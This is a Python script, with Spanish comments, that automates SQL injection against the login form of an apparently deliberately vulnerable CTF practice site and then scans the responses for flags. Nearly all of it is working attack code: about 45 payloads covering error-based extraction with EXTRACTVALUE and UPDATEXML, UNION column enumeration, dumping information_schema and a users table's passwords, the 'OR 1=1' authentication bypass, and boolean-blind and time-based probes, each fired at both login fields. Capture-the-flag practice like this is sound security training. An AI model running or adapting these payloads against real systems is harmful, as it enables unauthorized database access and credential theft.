#!/usr/bin/env python3
import requests
import time
import re
import base64

# URL del target
url = "http://hackme1.vulnmachines.com/sqli/Error-based/Post-error-based-single.php"

def test_specific_payload(payload, param="uname"):
    try:
        data = {
            "uname": payload if param == "uname" else "admin",
            "passwd": payload if param == "passwd" else "admin", 
            "login": "login"
        }
        
        print(f"\n[TESTING] {param}: {payload}")
        response = requests.post(url, data=data, timeout=5)
        content = response.text
        
        # Buscar flags con patrones específicos
        flag_patterns = [
            r'vnm\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'VNM\{[^}]+\}',
            r'[a-zA-Z0-9_]{20,}',
            r'[a-f0-9]{32,}',
            r'[a-f0-9]{40,}',
        ]
        
        found_flags = []
        for pattern in flag_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                found_flags.extend(matches)
                print(f"[FLAG FOUND] {pattern}: {matches}")
        
        # Buscar en el código fuente completo
        if "vnm" in content.lower() or "flag" in content.lower():
            print(f"[POTENTIAL FLAG] Found 'vnm' or 'flag' in response")
            # Guardar respuesta que contiene flag
            with open(f"flag_response_{param}_{hash(payload) % 10000}.html", 'w') as f:
                f.write(content)
            print(f"[SAVED] Response with potential flag saved")
        
        # Buscar diferencias en la respuesta
        if len(content) != 5238:
            print(f"[LENGTH DIFFERENCE] {len(content)} (expected 5238)")
            with open(f"different_response_{param}_{hash(payload) % 10000}.html", 'w') as f:
                f.write(content)
            print(f"[SAVED] Different response saved")
        
        # Buscar errores específicos
        error_patterns = [
            r'MySQL error.*?(\d+)',
            r'SQL error.*?(\d+)',
            r'Database error.*?(\d+)',
            r'Warning.*?mysql',
            r'Fatal error.*?mysql',
            r'You have an error in your SQL syntax',
            r'Unknown column',
            r'Table.*doesn\'t exist',
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"[ERROR] {pattern}: {matches}")
        
        return found_flags
        
    except Exception as e:
        print(f"[ERROR] {e}")
        return []

def main():
    print("=== Final Flag Search Attempt ===")
    print(f"Target: {url}")
    print("=" * 50)
    
    # Payloads específicos para error-based SQL injection
    final_payloads = [
        # Error-based extraction con diferentes técnicas
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns LIMIT 1), 0x7e)) --",
        
        # Buscar flags específicamente
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT flag FROM flag LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM flag LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT data FROM data LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret FROM secret LIMIT 1), 0x7e)) --",
        
        # Union queries con diferentes números de columnas
        "admin' UNION SELECT 1 --",
        "admin' UNION SELECT 1,2 --",
        "admin' UNION SELECT 1,2,3 --",
        "admin' UNION SELECT 1,2,3,4 --",
        "admin' UNION SELECT 1,2,3,4,5 --",
        "admin' UNION SELECT 1,2,3,4,5,6 --",
        "admin' UNION SELECT 1,2,3,4,5,6,7 --",
        "admin' UNION SELECT 1,2,3,4,5,6,7,8 --",
        
        # Información específica
        "admin' UNION SELECT version(),2,3,4,5 --",
        "admin' UNION SELECT user(),2,3,4,5 --",
        "admin' UNION SELECT database(),2,3,4,5 --",
        "admin' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --",
        "admin' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns --",
        
        # Buscar en tablas específicas
        "admin' UNION SELECT flag,2,3,4,5 FROM flag --",
        "admin' UNION SELECT value,2,3,4,5 FROM flag --",
        "admin' UNION SELECT data,2,3,4,5 FROM data --",
        "admin' UNION SELECT secret,2,3,4,5 FROM secret --",
        "admin' UNION SELECT password,2,3,4,5 FROM users --",
        "admin' UNION SELECT username,2,3,4,5 FROM users --",
        
        # Técnicas de bypass
        "admin' OR '1'='1' --",
        "admin' OR 1=1 --",
        "admin' OR '1'='1' #",
        "admin' OR 1=1 #",
        
        # Blind SQL injection
        "admin' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "admin' AND (SELECT COUNT(*) FROM information_schema.tables) = 1 --",
        "admin' AND (SELECT COUNT(*) FROM information_schema.tables) = 2 --",
        
        # Time-based
        "admin' AND SLEEP(5) --",
        "admin' OR SLEEP(5) --",
        "admin'; WAITFOR DELAY '00:00:05' --",
        
        # Subqueries
        "admin' UNION SELECT (SELECT table_name FROM information_schema.tables LIMIT 1),2,3,4,5 --",
        "admin' UNION SELECT (SELECT column_name FROM information_schema.columns LIMIT 1),2,3,4,5 --",
        
        # Buscar flags en todas las tablas
        "admin' UNION SELECT 1,2,3,4,5 FROM information_schema.tables WHERE table_name LIKE '%flag%' --",
        "admin' UNION SELECT 1,2,3,4,5 FROM information_schema.tables WHERE table_name LIKE '%secret%' --",
        "admin' UNION SELECT 1,2,3,4,5 FROM information_schema.tables WHERE table_name LIKE '%data%' --",
    ]
    
    all_flags = []
    
    # Probar payloads en uname
    print("\n[TESTING UNAME PARAMETER]")
    for payload in final_payloads:
        flags = test_specific_payload(payload, "uname")
        all_flags.extend(flags)
        time.sleep(0.3)  # Reducir delay
    
    # Probar payloads en passwd
    print("\n[TESTING PASSWD PARAMETER]")
    for payload in final_payloads:
        flags = test_specific_payload(payload, "passwd")
        all_flags.extend(flags)
        time.sleep(0.3)
    
    # Resumen
    if all_flags:
        print(f"\n[SUMMARY] Flags found: {set(all_flags)}")
    else:
        print("\n[SUMMARY] No flags found in final attempt")
        print("This might be a different type of challenge or the flag is hidden differently")
        
        # Listar archivos guardados
        import os
        files = [f for f in os.listdir('.') if f.startswith('flag_response_') or f.startswith('different_response_')]
        if files:
            print(f"Files with potential flags: {files}")

if __name__ == "__main__":
    main()